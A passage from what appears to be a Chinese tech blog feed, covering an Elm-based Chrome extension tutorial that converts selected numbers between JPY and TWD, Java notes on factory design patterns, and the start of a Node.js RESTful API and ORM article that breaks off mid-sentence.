學習資源既然語法這麼困難，要學習的話，勢必要有完善的 Docs 或是範例參考，但可惜的是，雖然 Elm 從 2012 出來到現在也將近七年了，使用人數還是小眾，要找尋範例或是教學都蠻困難的，推薦的方式是先去官網閱讀 guide line，理解基本概念與最新版本的 API，並大致瀏覽一下語法，接著到 Beginning Elm 釐清一下不懂的部分，因為這網站將蠻多觀念以圖像化的方式說明，我覺得會比官方網站的 guide 好懂。
不過要注意的一點是，Beginning Elm 的內容基本上是 Elm 0.18 的版本，並非現在最新的 0.19，所以在語法與一些 core lib 的用法上會不一樣，但觀念的理解還是共通的，所以能交互參照。
這也是我在實作 Elm 遇到的一個阻礙，網路上大多的教學集中在 2017，當時還是 0.18 版本，因此許多範例現在都沒辦法正常運作，除非你降版。
開始實作！無論如何，頭洗下去了還是得繼續實作。
有實作過 Chrome extension 的人應該都知道，基本的三大元素就是：background.js、content.js 與 popup.html，其彼此之間環境互相獨立，透過 postMessage 來溝通。
而既然 Elm 能編譯成 JavaScript，我就想我應該可以分別撰寫 Elm application 然後 compile 成 background.js，content.js，這做法可能會有點奇怪，既然要用 Elm，你又寫 JavaScript？
但我覺得這樣反而比較能在漸進式的學習 Elm，一些較困難理解的部分就還是交由 JavaScript 處理。
有了想法後開始搜尋範例，雖然新版的範例不多，但好在還是能從舊版中找到符合我心中所想的範例，只是得花點時間 upgrade 成新版。
elm-chrome-extension 是我找到最符合我預期的範例。
而這是我翻新成 0.19 後的版本 elm-chrome-extension 0.19 版。
基本架構
我們這邊將 background.js 與 content.js 當作不同的 Elm application 來撰寫，彼此之間再透過 Elm 特殊的 JavaScript Interop 來溝通（後面會講到）。
由於個別當作一個 application，就用各自的 webpack 來幫忙 compile 跟打包。
Model.elm 則是單純用來定義我們整個 Extension 的 State。
最後三個 Elm application 編億完的結果都會放入 dist 中，也就是我們最後的成品。
另外前面沒有提到的一個資料夾 elm-stuff，其功用就像 node_modules 一樣，當你 elm install 完後，Elm 會將 packages 放入其中。
而 elm.json 則是類似 package.json 加上 package-lock.json 的存在：
&#123;    &quot;type&quot;: &quot;application&quot;,    &quot;source-directories&quot;: [        &quot;./background&quot;,        &quot;./content&quot;,        &quot;./common&quot;    ],    &quot;elm-version&quot;: &quot;0.19.0&quot;,    &quot;dependencies&quot;: &#123;        &quot;direct&quot;: &#123;            &quot;elm/browser&quot;: &quot;1.0.1&quot;,            &quot;elm/core&quot;: &quot;1.0.0&quot;,            &quot;elm/html&quot;: &quot;1.0.0&quot;,            &quot;elm/json&quot;: &quot;1.1.3&quot;,            &quot;myrho/elm-round&quot;: &quot;1.0.4&quot;        &#125;,        &quot;indirect&quot;: &#123;            &quot;elm/time&quot;: &quot;1.0.0&quot;,            &quot;elm/url&quot;: &quot;1.0.0&quot;,            &quot;elm/virtual-dom&quot;: &quot;1.0.2&quot;        &#125;    &#125;,    &quot;test-dependencies&quot;: &#123;        &quot;direct&quot;: &#123;&#125;,        &quot;indirect&quot;: &#123;&#125;    &#125;&#125;

可以看到 Elm 是用 exact versions，可以保證 reliable builds。而 dependencies 中的 direct 就是所有你能直接在 Elm code 中 import 的 package，而那些 package 所各自引用的其他 lib 則會自動被載入到 indirect 中。
值得注意的是，雖然我們整個 project 用了三個 Elm application，但我們是共用同一個 elm.json 來管理 packages，因此在 source-directories 的地方我們羅列三個 source 來源。
專案實作方式概略這個 Extension 的功能很單純，流程如下：
使用者 Select 了某段數字後，就會由 Content.js 將選取的數字傳遞給 Background.js 去處理，而 Background.js 就會負責拉取匯率 API，並將使用者選取的數字進行換算，接著將結果更新到 Model 上，再經由 Model 的變動去觸發 Content.js 進行 View 的更新。
我們一步一步來看，主要會 Focus 在如何更新 Model，以及如何讓 Elm(計算邏輯) 與 JavaScript(頁面 Dom 與 Chrome API) 互相溝通。
Model首先，我們先從最簡單的 Model 看起：
module Model exposing (Model)-- This is the model in common among all of our appstype alias Model =    &#123; result: Float, selectedContent: Int, exrateTWD: Float, exrateJPY: Float &#125;

line 1 就是 Elm 中載入 package 的方式，而在我們的 application 中，Model 內容很單純，主要是記錄型別為 Float 的結果（result)、Int 的 selectContent、Float 的 exrateTWD 與 exrateJPY。
然後透過 webpack loader 來幫忙編譯：
module.exports = &#123;  module: &#123;    rules: [      &#123;...&#125;,      &#123;        test: /\.elm$/,        exclude: [/elm-stuff/, /node_modules/],        use: [&#x27;elm-hot-webpack-loader&#x27;, &#x27;elm-webpack-loader?verbose=true&#x27;],      &#125;,    ],  &#125;,&#125;

Main.elm in Background.js在 Background 資料夾中，我們有一個 index.js 與 Main.elm，index.js 負責與 content.js 溝通和處理 chrome api 相關的 JavaScript；Main.elm 則是負責計算匯率以及更新 Model。
index.js 會與 Main.elm 互相溝通，Webpack 會將兩者打包成 background.js。
但 JavaScript 怎麼與 Elm 溝通呢？容許我從 Beginning Elm 中借張圖：

從這張圖可以很清楚看到 Elm runtime 是怎麼跟外部溝通，又是怎麼與我們程式邏輯互動。
透過 Command 我們可以對 Elm runtime 下達指令去執行 side effect，像是 HTTP request 等等；Elm runtime 則藉由 Subscription 與 Message 將 side effect 結果傳遞回 application 本身。
透過 Message，Elm runtime 與我們的 application 可以知道要執行甚麼動作，包含 Update State（Model）或是更新 View。
而若是需要與外部 JavaScript 溝通，則有 Ports 提供橋樑，在 JavaScript 中，能使用類似 postMessage 的方式傳遞資料。
來看看 background 中的 Main.elm：
-- ... 省略 import packages-- PORTS FROM JAVASCRIPTport selected : (Model -&gt; msg) -&gt; Sub msg-- PORTS TO JAVASCRIPTport broadcast : Model -&gt; Cmd msg-- MODELinit : Flags -&gt; ( Model, Cmd Msg )init flags =    ( &#123;        selectedContent = flags.selectedContent,        exrateTWD = flags.exrateTWD,        exrateJPY = flags.exrateJPY,        result = flags.result     &#125;    , Cmd.none    )type Msg    = NoOp    | Select Modelupdate : Msg -&gt; Model -&gt; ( Model, Cmd Msg )update msg model =    case msg of        NoOp -&gt;            ( model, Cmd.none )        Select data -&gt;            let                nextModel =                    &#123; model | result = (toFloat data.selectedContent) * (data.exrateTWD / data.exrateJPY) &#125;            in            ( nextModel, broadcast nextModel )subscriptions : Model -&gt; Sub Msgsubscriptions model =    selected (\newModels -&gt; Select newModels)type alias Flags =    &#123;      selectedContent: Int,      exrateTWD: Float,      exrateJPY: Float,      result: Float    &#125;main : Program Flags Model Msgmain =    Platform.worker        &#123; init = init        , update = update        , subscriptions = subscriptions        &#125;

background 的 Main.elm 中，主要有幾個區塊：

port keyword：定義用來給外部 JavaScript 呼叫的函數，以及 Elm 要傳遞資料給 JavaScript 時呼叫的函數

init 函數：我們定義 init 函數，初始化 application 的 Model (State），Flags 是 Elm 中特殊的型別，外部 JavaScript 可以透過 Flags 在 Elm 的 init 階段傳遞初始 State 資料。如同上面範例中，init 函數接收一個 Flags 參數，並將其 assign 到新的物件當中，並且回傳，而這物件就是（也必須是）Model。

subscriptions：當外部 JavaScript 呼叫我們在 port 中定義的函數時，Elm 會透過 subscriptions 來處理回應，基本上都會是呼叫一個函數，而該函數會 Trigger update，丟入 一個 Message 去更新 Model，以上面例子來說，JavaScript 會傳進新的 Model，而 Elm subscriptions 將新的 Model 以及我們指定的 Message 傳遞給 update 去真正的將 Model 更新。

update：update 相對單純一點，接收 Message 與 Model 型別的物件，根據 Message 的內容去判斷要進行什麼更新。在上面例子中，我們接收到 Select 這個 message，代表收到 JavaScript 傳來的新 Model（也就是使用者選取的數字），而 Model 中有要轉換的金額，以及台日幣的匯率差，我們在這邊進行主要的邏輯運算，將結果產生成新的 Model，透過呼叫 broadcast 這個 定義在 port 中的 Command，將其回傳回 JavaScript。

main：是 Main.elm 這個程式的主要進入點，這隻 Elm 程式並沒有參與到 View 的部分，因此我們使用 Platform.worker 函數實作，將定義好的 init, update 與 subscriptions 傳入。


篇幅有限實在無法將每個 API 都詳細介紹，建議參照官網 Guide 了解其詳細內容。
index.js in Background.jsJavaScript 的部分就簡單一些，重點在於初始化 State：
import &#123; Elm &#125; from &#x27;./Main.elm&#x27;;let currState = &#123;  selectedContent: 0,  exrateTWD: 0.0,  exrateJPY: 0.0,  result: 0.0&#125;const app = Elm.Main.init(&#123;  flags: currState&#125;);

在 index.js 我們載入 Main.elm，並呼叫其 Main.init 函數，傳入 flags 物件來初始化 state。
接著，subscribe Elm 的 ports broadcast，當 Elm 傳遞訊息過來時，我們透過 chrome 的 postMessage 傳遞給 content.js。（這邊的 port 是 chrome.runtime.onConnect 的 port，細節請看 source code ）
function broadcast(state) &#123;  currState = state  for (const port of listeners) &#123;    port.postMessage(state)  &#125;&#125;app.ports.broadcast.subscribe(state =&gt; &#123;  broadcast(state)&#125;)

最後這邊我有點偷吃步，由於透過 Elm 發送 HTTP request 後的結果與我目前的 model 之間要如何整合，我在一天的 hackday 中實在沒有研究出來，所以省去那段，讓 fetch 匯率資料的部分由 JS 完成，最後再透過 port 的 selected 將 API result send 給 Elm：
chrome.runtime.onMessage.addListener((request, sender) =&gt; &#123;  if (request.kind === &#x27;selected&#x27;) &#123;    const selectNum = request.selectedContent.replace(&#x27;,&#x27;, &#x27;&#x27;);    fetch(&#x27;https://tw.rter.info/capi.php&#x27;)      .then(function(response) &#123;        return response.json()      &#125;)      .then(function(myJson) &#123;        const &#123;          USDJPY: &#123; Exrate: ExrateJPY &#125;,          USDTWD: &#123; Exrate: ExrateTWD &#125;        &#125; = myJson        app.ports.selected.send(&#123; result: 0.0, exrateTWD: ExrateTWD, exrateJPY: ExrateJPY, selectedContent: +selectNum&#125;)      &#125;);  &#125;&#125;)

Main.elm in Content.js處理好 Background.js，接著就是 Content.js。
Content 中的 Main.elm 主要負責接收到更新的 Model，然後將其更新到 DOM 上：
-- 省略 import packages-- PORTS FROM JAVASCRIPTport onState : (Model -&gt; msg) -&gt; Sub msginit : Model -&gt; ( Model, Cmd Msg )init model =    ( model    , Cmd.none    )type Msg    = NoOp    | NewState Modelupdate : Msg -&gt; Model -&gt; ( Model, Cmd Msg )update msg model =    case msg of        NoOp -&gt;            ( model, Cmd.none )        NewState newModel -&gt;            ( newModel, Cmd.none )view : Model -&gt; Html Msgview model =    Html.div        [ Html.Attributes.class &quot;Content&quot;        ]        [          Html.text (&quot;It&#x27;s &quot;),          Html.div            [ Html.Attributes.class &quot;InnerContent&quot;            ]            [                Html.div [][                    Html.text (round 2 model.result)                ],                Html.div                    [ Html.Attributes.class &quot;units&quot;                    ]                    [                        Html.text (&quot; TWD&quot;)                    ]            ]        ]subscriptions : Model -&gt; Sub Msgsubscriptions model =    onState NewStatemain : Program Model Model Msgmain =    Browser.element        &#123; init = init        , update = update        , view = view        , subscriptions = subscriptions        &#125;

聰明的讀者看到這段 code 應該會發現，這邊的 port, init 與 subscriptions 基本上形式與 Background 的一樣，只是更簡單一點，當 subscription 收到 JavaScript 呼叫的 onState 函數時，我們傳遞 NewState Message 給 update，而 update 就只是單純的回傳新的 Model。
唯一差別在於 view 與 main。
在 Elm 中，view 會接受 Model 為參數，並回傳 HTML DOM，在範例中，我們產生了三層的 div，第三層有兩個 div 並行，分別呈現轉換後的匯率數字，以及單位，這邊我還用了一個 elm 的 package 來 round 數字到小數點後兩位。
而由於 Content 的 Main.elm 有跟 Browser 互動（產生 HTML），所以需要的不是 Platform.worker 而是 Browser.element，他會將 View 也綁定進去。（一樣，詳情請參照官網 Guide ）
index.js in Content.jsContent 中的 JavaScript 就更單純了，基本上就是 createElement 出一個 div，並且設定 mouseup listener，讓使用者選取文字後，能夠 sendMessage 給 background.js，並且設定好 Elm DOM 要掛載的 Real Dom 位置與 style (index.css)：
require(&#x27;./index.css&#x27;)const mountNode = document.createElement(&#x27;div&#x27;);document.body.append(mountNode);import &#123; Elm &#125; from &#x27;./Main.elm&#x27;;let app;document.addEventListener(&#x27;mouseup&#x27;, () =&gt; &#123;  // 利用 window.getSelection() 抓取使用者選取的數字  const selectedObj = window.getSelection();  const selectedContent = selectedObj.toString();  //...  // 這邊忽略的 code 主要在是：  // 計算 Elm 產生的 DOM 該插入到頁面中的哪個位置  // 判斷何時該讓 DOM 消失  //...  if (selectedContent &amp;&amp; selectedContent!== &#x27;&#x27;) &#123;    chrome.runtime.sendMessage(&#123; kind: &#x27;selected&#x27;, selectedContent &#125;);  &#125;&#125;);const port = chrome.runtime.connect(&#123; name: &#x27;broadcast&#x27; &#125;);port.onMessage.addListener(state =&gt; &#123;  if (!app) &#123;    app = Elm.Main.init(&#123;      node: mountNode,      flags: state    &#125;);    return;  &#125;  app.ports.onState.send(state);&#125;)

在 port.onMessage 的 listener 中，我們會監聽到由 Background.js 傳遞來的初始 State，然後才 init Content 這邊的 Elm application，並將 Background.js 傳來的 state 一起傳入，若後續有更新 state，則透過 port 的 onState 來更新。
基本上這樣一來，整個 Extension 的工作就完成了，但省略了不少細節，完整程式碼與其他細節只好請大家直接看原始碼會更清楚一點： source code
如何 Debug在用 Elm 製作 Chrome extension 的過程中，Debug 的方式其實跟一般用 JS 開發一樣，都是透過 inspect 從 browser 中到 background.js 與 content.js 下中斷點，但是麻煩的是，在這邊的 background.js 與 content.js 都有一大部分是 Elm compile 出來的 JS，是沒有類似 source map 的東西能讓你直接在 Elm code 內 Debug 的，所以除錯起來真的不是很方便，之後若有研究到方法再來更新。也歡迎大家給予指導！
結論與心得Elm 的確是蠻優雅的語言，但不是能在短時間內完美駕馭的…尤其是 Debug 的難度以及文件範例的相對稀少，都讓人容易退卻，但我還是蠻開心能利用這次機會親手玩玩 Elm，並且製作了一個我用得上的工具，當然還有一些需要改善的部分，但已經堪用了。希望之後還能有時間繼續研究！有興趣的讀者或許能一起加入他們的 Community 討論！
資料來源
elm-lang
Beginning Elm
elm github
Elm 作者 ｀2012 年的演講影片
Elm——函数式前端框架介绍

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>Elm</tag>
        <tag>Chrome extension</tag>
      </tags>
  </entry>
  <entry>
    <title>設計模式 - 工廠方法及抽象工廠</title>
    <url>/2017/05/22/factory-method-and-abstract-factory/</url>
    <content><![CDATA[以下文章是閱讀 深入淺出 Design Pattern，還有 聖經的筆記，要更深入的理解一定要去看這兩本書。圖片截圖自 lynda.com 的Foundations of Programming: Design Patterns，這是學習設計模式非常好的課程。
來點個 Pizza 吧今天想設計一個PizzaStore，裡面可以點 Pizza。
public class PizzaStore &#123;    Pizza orderPizza(String type)&#123;    	Pizza pizza;    	if(type.equals(&quot;cheese&quot;))&#123;	    pizza = new CheesePizza();    	&#125;else if(type.equals(&quot;greek&quot;))&#123;	    pizza = new GreekPizza();    	&#125;else if(type.equals(&quot;pepperoni&quot;))&#123;	    pizza = new PepperoniPizza();    	&#125;    	pizza.prepare();    	pizza.cook();    	return pizza    &#125;&#125;

看起來不差。compile-time 的時候 pizza.prepare() 跟 pizza.cook() 是哪一種 pizza 我不用知道 ，我只要保證各個 Pizza 的 subclass 有實作 prepare() 和 cook() 就可以 。
Polymorphism Rocks!
但只要有新的 Pizza 推出或是有舊的要拿掉，需要改這裡的 if-else 有點麻煩。
簡單工廠模式別忘了 Design Pattern rule #1: Encapsulate what varies
把剛剛 orderPizza() 裡面的所有 if-else 拉出來到一個工廠裡，這個工廠專門製作 pizza。
public class SimplePizzaFactory &#123;    public Pizza createPizza(String type) &#123;	Pizza pizza = null;	if(type.equals(&quot;cheese&quot;))&#123;	    pizza = new CheesePizza();    	&#125;else if(type.equals(&quot;greek&quot;))&#123;	    pizza = new GreekPizza();    	&#125;else if(type.equals(&quot;pepperoni&quot;))&#123;	    pizza = new PepperoniPizza();    	&#125;    	return pizza;    &#125;&#125;

就這麼簡單，這就是簡單工廠 。
簡單工廠管理物件的創造，如果 client 要取得物件，只要給簡單工廠正確的參數就可以。
然後 pizza 店的 constructor 要丟一個工廠進去。
public class PizzaStore &#123;    SimplePizzaFactory factory;    public PizzaStore(SimplePizzaFactory factory) &#123; 	this.factory = factory;    &#125;    public Pizza orderPizza(String type) &#123;	Pizza pizza;	pizza = factory.createPizza(type);	pizza.prepare();	pizza.cook();	return pizza;    &#125;&#125;

簡單工廠模式，讓我們把 pizza 的創造和 pizza 的使用分開了，減少了 client 對於實作的依賴。
我們成功的判斷出 orderPizza 這個函數裡面會變動的部分，分離出一個工廠，去處理他。如果你今天要改變處理方式，你去改那個工廠或是給我一個新工廠就可以。我不管你怎麼創造的，我只在乎你回傳給我的 object 的 class 是 Pizza 的 subclass。

簡單工廠模式的優點就是分離了物件的使用和創造。client 不管你怎麼生成的，但缺點也很明確，每當有新的 class 出來工廠就要改，複雜度上升得很快。
適用情況是需要創建的種類比較少，而且客戶對於怎麼創建對象的方法不關心。
生意不錯 開個分店實作了簡單工廠模式之後，同樣是 cheese pizza，紐約跟芝加哥的做法就完全不一樣。我們可以修改 SimplePizzaFactory 讓 createPizza 多吃一個參數 style。
public class SimplePizzaFactory &#123;    public Pizza createPizza(String style, String type) &#123;	Pizza pizza = null;	if(style.equals(&quot;NY&quot;))&#123;	    if(type.equals(&quot;cheese&quot;))&#123;	    	pizza = new NYStyleCheesePizza();    	    &#125;else...	    ...	&#125;else if(style.equals(&quot;chicago&quot;))&#123;	    if(type.equals(&quot;cheese&quot;))&#123;                pizza = new ChicagoStyleCheesePizza();            &#125;else...                ...	&#125;    	return pizza;    &#125;&#125;
好啦我們都那麼熟了，再演就不像了，我們在這裡應該用繼承。
ChicagoPizzaFactory 跟 NYPizzaFactory 都繼承自 SimplePizzaFactory。現在我們需要為不同 style 的 PizzaStore 建立不同的工廠。
如果今天我要點 NY 風味的起司 pizza。
NYPizzaFactory nyFactory = new NYPizzaFactory();PizzaStore nyStore = new PizzaStore(nyFactory);nyStore.orderPizza(&quot;cheese&quot;);
明天我想點芝加哥風味的起司 pizza
ChicagoPizzaFactory chicagoFactory = new ChicagoPizzaFactory()PizzaStore chicagoStore = new PizzaStore(chicagoFactory);chicagoStore.orderPizza(&quot;cheese&quot;);

看似沒啥問題，我們現在其實進入了見山不是山見水不是水的境界。

為什麼這麼說呢？我們為了decouple物件的創造和物件的使用，製造了一個工廠。可是為了 reuse 工廠的 code，我們使用了繼承。
現在我的 SimplePizzaFactory 其實只是一個介面，我定義了所有繼承了我的 class 應該要做什麼事（返回 customized defined pizza），真正實際創造物件的地方是子類別的實體工廠。
這兩種功能（decouple + hierarchy）同時需要的時候，我們就可以用上今天的主角。
工廠方法模式工廠方法模式定義了一個建立物件的介面，但由子類決定要實例化的類別為何。工廠方法讓類別把 實例化 的動作推遲到了子類。
我們現在把 createPizza 拉回來 PizzaStore 裡，讓子類別來決定怎麼 createPizza。
public abstract class PizzaStore &#123;    abstract Pizza createPizza(String type);    public Pizza orderPizza(String type) &#123;	Pizza pizza = createPizza(type);	pizza.prepare();	pizza.cook();	return pizza;    &#125;&#125;
createPizza是抽象方法，留給子類別繼承。
讓 NYPizzaStore 去繼承 PizzaStore，實作 createPizza。
public class NYPizzaStore extends PizzaStore &#123;    Pizza createPizza(String item) &#123;	if (item.equals(&quot;cheese&quot;)) &#123;   	    return new NYStyleCheesePizza();	&#125; else if (item.equals(&quot;veggie&quot;)) &#123;	    return new NYStyleVeggiePizza();	&#125; else if (item.equals(&quot;clam&quot;)) &#123;	    return new NYStyleClamPizza();	&#125; else if (item.equals(&quot;pepperoni&quot;)) &#123;	    return new NYStylePepperoniPizza();	&#125; else return null;    &#125;&#125;

原本我物件的建立，交給一個外來的工廠處理，現在我把它交給我的子類別處理，而且父類別還可以 call子類別實作的函數。這種會互 call 的 function 通常依賴性都很高，但我們利用工廠模式讓父類別跟子類別的依賴鬆綁（decouple）了。
套用了工廠方法模式之後，怎麼點 pizza 呢？
PizzaStore nyStore = new NYPizzaStore();Pizza pizza = nyStore.orderPizza(&quot;cheese&quot;);

輕鬆！
結構

Product（Pizza）: 定義 factoryMethod（createPizza） 所造物件的介面。

ConcreteProduct（NYStyleCheesePizza）: 實作 Product。

Creator（PizzaStore）: 宣告 factoryMethod（必須傳回Product），和其他 client 可以 call 的 API。

ConcreteCreator（NYPizzaStore）: 實作 factoryMethod，回傳 ConcreteProduct 的 instance。


有個小細節，其實工廠方法不一定是 abstract。也可以 Creator 就先偷偷實作 factoryMethod，回傳 Product，subclass 可以選擇要不要 override 工廠方法。
優缺點優點除了跟簡單工廠一樣，隱藏了創建物件的細節，最重要的是加入新產品不需要改動 Creator，你直接繼承 Creator 就好了 。
Client 的用法都是一樣不需要改，完全符合開放封閉守則。
缺點就是 ConcreteCreator 跟 ConcreteProduct 會成對的增加。比如你今天想做加州披薩，你在定義完加州 pizza之後，還要再定義一個加州 pizza 工廠。

工廠方法的限制工廠方法的 factoryMethod，只能創建一個對象，比如說 Pizza 。
但如果我們想要更加細分想創建的東西，比如說 Pizza 的所需原料（麵團、醬料、起司、蛤蠣）。如果我們用工廠方法的話，我們需要為每一個原料都創一個工廠。
在這個例子就是 NY 麵團工廠、NY 醬料工廠、NY 起司工廠、NY 蛤蠣工廠、Chicago 麵團工廠、Chicago 醬料工廠、Chicago 起司工廠、Chicago 蛤蠣工廠。
因為每個工廠方法只能生產一個產品。
public class NYPizzaStore extends PizzaStore &#123;    Pizza createPizza(String item) &#123;	DoughFactory doughFactory = new NYDoughFactory();	SauceFactory sauceFactory = new NYSauceFactory();	CheeseFactory cheeseFactory = new NYCheeseFactory();	ClamFactory clamFactory = new NYClamFactory();	if (item.equals(&quot;cheese&quot;)) &#123;    	    return new NYStyleCheesePizza(doughFactory, 		sauceFactory, cheeseFactory);	&#125; else if (item.equals(&quot;veggie&quot;)) &#123;	    return new NYStyleVeggiePizza(doughFactory, 		sauceFactory, cheeseFactory);	&#125; else if (item.equals(&quot;clam&quot;)) &#123;	    return new NYStyleClamPizza(doughFactory, 		sauceFactory, cheeseFactory, clamFactory);	&#125; else if (item.equals(&quot;pepperoni&quot;)) &#123;	    return new NYStylePepperoniPizza(doughFactory, 		sauceFactory, cheeseFactory);	&#125; else return null;    &#125;&#125;

這樣實在是太難 maintain 了。所以我們把相關的產品（NY 麵團工廠、NY 醬料工廠、NY 起司工廠、NY 蛤蠣工廠）組成一個產品族，交給同一個工廠來生產，鼎鼎大名的抽象工廠就誕生了。

抽象的 Pizza 原料工廠定義了每個原料工廠要創建的東西的介面。每個繼承了 Pizza 原料工廠的具體原料工廠乖乖 implement 所有需要創建的東西。
再來些例子，如果工廠方法生產的是房子，抽象工廠可以生產一個房子的所有家具（沙發電視電風扇）。如果工廠方法生產的是武士，抽象工廠可以生產一個武士的所有配備（盔甲、鞋子、手套）。
第一眼看起來很可怕，但其實只是把工廠的責任從生產一個產品，變成生產一個產品族。
產品族和產品等級結構先解釋兩個名詞。
產品等級結構：產品的繼承結構。比如一個抽象類是麵糰，子類別有 Chicago 麵團跟 NY 麵團，這三個形成了一個產品等級結構。
產品族：同一個工廠生產的所有產品，其中的每個產品都是座落在不同的產品等級結構中的其中一個產品。
一圖勝過千言萬語。
套用抽象工廠後public class CheesePizza extends Pizza &#123;    PizzaIngredientFactory = ingredientFactory;    public CheesePizza(PizzaIngredientFactory ingredientFactory)&#123;	this.ingredientFactory = ingredientFactory;    &#125;    void prepare()&#123;	dough = ingredientFactory.createDough();	sauce = ingredientFactory.createSauce();	cheese = ingredientFactory.createCheese();    &#125;&#125;
至於 PizzaStore 跟他的子類，概念跟工廠方法一樣，由子類決定要實例化的類別為何。
public class NYPizzaStore extends PizzaStore &#123;    protected Pizza createPizza(String item) &#123;	Pizza pizza = null;	PizzaIngredientFactory ingredientFactory = new NYPizzaIngredientFactory();	if (item.equals(&quot;cheese&quot;)) &#123;   	    pizza = new CheesePizza(ingredientFactory);	&#125; else if (item.equals(&quot;veggie&quot;)) &#123;  	    pizza = new VeggiePizza(ingredientFactory);	&#125; else if (item.equals(&quot;clam&quot;)) &#123;	    pizza = new ClamPizza(ingredientFactory);	&#125; else if (item.equals(&quot;pepperoni&quot;)) &#123;	    pizza = new PepperoniPizza(ingredientFactory);				&#125; 	return pizza;    &#125;&#125;
點 pizza 的方法就跟工廠方法一樣。
PizzaStore nyStore = new NYPizzaStore();Pizza pizza = nyStore.orderPizza(&quot;cheese&quot;);

對 client 來說用法一樣，client 並不知道裡面的產品已經變成產品族。
抽象工廠用一個抽象工廠來定義一個創建 產品族 的介面，產品族裡面每個產品的具體類別由繼承抽象工廠的實體工廠決定。
上面那句話請務必讀懂他
結構

AbstractFactory（PizzaIngredientFactory）: 宣告出各個創建同一產品族產品的介面。

ConcreteFactory（NYPizzaIngredientFactory）: 實作 AbstractFactory。

AbstractProduct（Dough）: 宣告產品等級結構的物品介面。

Product（ThickCrustDough）: ConcreteFactory 所建構的成品，需要實作 AbstractProduct。


優缺點1.一樣區隔了每個產品的生成和使用，client 被隔離在產品的 class 之外。client 甚至不知道什麼產品被創建了。他只要知道那個產品有哪些函數可以給他 call，這個特點使得抽換具體工廠這件事變得非常容易。
2.性質類似的產品集中管理（所有 NY 的原料一起管理，或是所有日式的傢俱一起管理）。今天有新的工廠要進來，他需要 implement 的 method 非常明確，照著 AbstractFactory 定義的介面實作就對了。某種程度而言也算是給 client 方便，我保證他只會用到同一個產品族的對象。
3.缺點非常致命，就是當我想在產品族加一個產品非常困難。因為我所有子工廠要跟著改，這被稱為開閉原則的傾斜性：新增產品族容易，但新增產品結構困難。
使用時機1.一個系統必須和產品的生成&#x2F;組合，保持獨立。
2.許多類似的產品可以組成產品族，方便集中管理，而且多於一個的產品族。
3.只想公開產品 interface 不想公開實作細節。
細說抽象工廠準備好豐收融會貫通的果實了嗎？Go！
1.抽象工廠定義了需要創建的產品族，由 concreteFactory 去實作抽象工廠，所以通常抽象工廠裡的每一個創建 product 的抽象方法，都是用工廠方法，由繼承的具體工廠來實現，這也是這兩個名詞常被搞混的原因。
2 . 

由此圖可以看得出來，如果我們用抽象工廠來實作 pizza 店，我們只需要實作2個工廠（ChicagoPizzaIngredientFactory、NYPizzaIngredientFactory），但如果我們用工廠方法來實作，我們需要實作8個工廠。
所以當你發現你的工廠方法們，遵循著一個產品族的 pattern，試著把這產品族分離出來寫稱抽象工廠的 interface，然後用具體工廠實現。這就是 Design Pattern rule #2: Program to an interface, not an implementation。
3.退化成工廠模式
如果你的抽象工廠裡定義的創建方法只有一個（只有一個產品等級結構），那你的抽象工廠就退化成工廠方法。你把上圖的 Dough 改成 Pizza，就是前半段工廠方法在說的東西
4.退化成簡單工廠模式
如果你只有一個具體工廠因為每個配料只有一個實作，所以沒有使用 interface 的必要，你把上圖的各個配料改成各個 pizza，就是上一篇的簡單工廠模式的例子。
總結只有簡單工廠跟抽象工廠，真的需要實作工廠。
工廠方法指的是一個方法，這個方法負責創造東西，且交由子類別負責繼承。
延伸閱讀
Design Pattern(3) - 裝飾者模式
Design Pattern(2) - 觀察者模式
Design Pattern(1) - 策略模式

關於作者：@jyt0532 後端工程師，喜歡學習新知挑戰新事物，最近覺得 Anti pattern 比 Design pattern 有趣。
]]></content>
      <tags>
        <tag>design pattern</tag>
      </tags>
  </entry>
  <entry>
    <title>用 Node.js 快速打造 RESTful API</title>
    <url>/2016/04/23/fast-restful-nodejs-api-backend/</url>
    <content><![CDATA[前言現今有些網站採用了 Single Page Application 的方案，後端只負責提供 API 讓前端抓取資料，達成完全的前後端分離。前端的選擇有很多種，你可以用 Angular，可以用 Ember.js，也可以用 React + Redux。至於後端的 API，必須符合固定格式，才能讓前端的人員比較好抓取。而這個「固定格式」，最常見的就是我們今天的重點：RESTful。
什麼是 RESTful？與起從硬生生的文字解釋下手，不如先從實際範例著手。假設現在你要寫一個部落格網站的後端 API，十個人可能會有十種寫法；例如說「抓取所有文章」這個功能：

&#x2F;api&#x2F;blog&#x2F;getList
&#x2F;api&#x2F;blog&#x2F;getAllArticle
&#x2F;api&#x2F;blog&#x2F;article&#x2F;getAll
&#x2F;api&#x2F;blog&#x2F;fetchAll
&#x2F;api&#x2F;blog&#x2F;all

但如果是採取 RESTful 的方案，就會符合一定的格式：



操作
Method
URL



所有文章
GET
&#x2F;api&#x2F;posts


單一文章
GET
&#x2F;api&#x2F;posts&#x2F;:id


新增文章
POST
&#x2F;api&#x2F;posts


刪除文章
DELETE
&#x2F;api&#x2F;posts&#x2F;:id


修改文章
PUT&#x2F;PATCH
&#x2F;api&#x2F;posts&#x2F;:id


在這個例子裡，文章（posts）是一個 Resource，你可以透過 HTTP 提供的幾種方法搭配不同的 URL 存取這個 Resource。
如果你對 RESTful 很有興趣，這邊是一些值得參考的文章：

什麼是REST跟RESTful?
淺談 REST 軟體架構風格
理解RESTful架構

ORMORM 的全稱是：Object Relational Mapping如果以資料庫來說的話，就是把你的資料庫對應到程式裡的物件。舉上面的部落格的例子，你的資料庫 table 可能是這樣：



欄位
類型
說明



id
int
id


title
text
標題


content
text
內文


created_at
timestamp
建立時間


對應到 Node.js 裡面的物件，你可以這樣：
// 建立文章Post.create(&#123;  title: &#x27;Hello Excel&#x27;,  content: &#x27;測試&#x27;&#125;)// 刪除 id 為 1 的文章Post.find(1).delete();

也就是說，你今天根本不用管背後的資料庫用的是哪一種，也不用管 table 的名稱到底是什麼，你只要對你知道的這個 Post 物件做操作即可。
Sequelize是一套很好用的 ORM Library，只要先定義好一份schema，就可以幫你把物件跟資料庫關連起來。
為什麼突然提到 ORM？有些讀者可能已經想到，其實 RESTful API 跟 ORM 之間，是有某種程度的關聯的。怎麼說呢？  
假設我今天要寫一個留言板的後端 API，而且我又同時採用 RESTful 跟 ORM，我的程式就會長這樣：
